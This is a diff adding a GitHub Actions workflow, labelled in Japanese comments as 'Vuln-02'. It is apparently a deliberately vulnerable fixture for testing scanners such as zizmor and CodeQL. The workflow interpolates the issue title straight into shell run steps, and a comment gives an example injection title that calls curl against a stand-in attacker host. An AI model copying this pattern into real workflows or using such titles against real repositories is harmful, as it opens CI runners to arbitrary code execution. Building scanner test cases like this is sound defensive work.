@@ -1,0 +1,24 @@
+# Vuln-02: Issue タイトルを直接 run フィールドで展開 (Script Injection)
+# 脆弱性: ${{ github.event.issue.title }} を run で直接参照している。
+#          攻撃者は Issue タイトルに "; curl attacker.example.com # を仕込むことで任意コード実行可能。
+# 検知想定: zizmor (expression-injection), CodeQL (actions/command-injection)
+
+name: "Vuln-02: Script Injection via Issue Title"
+
+on:
+  issues:
+    types: [opened]
+
+jobs:
+  triage:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Print issue title
+        run: |
+          echo "Processing issue: ${{ github.event.issue.title }}"
+
+      - name: Label based on title
+        run: |
+          if echo "${{ github.event.issue.title }}" | grep -qi "bug"; then
+            echo "This is a bug report"
+          fi
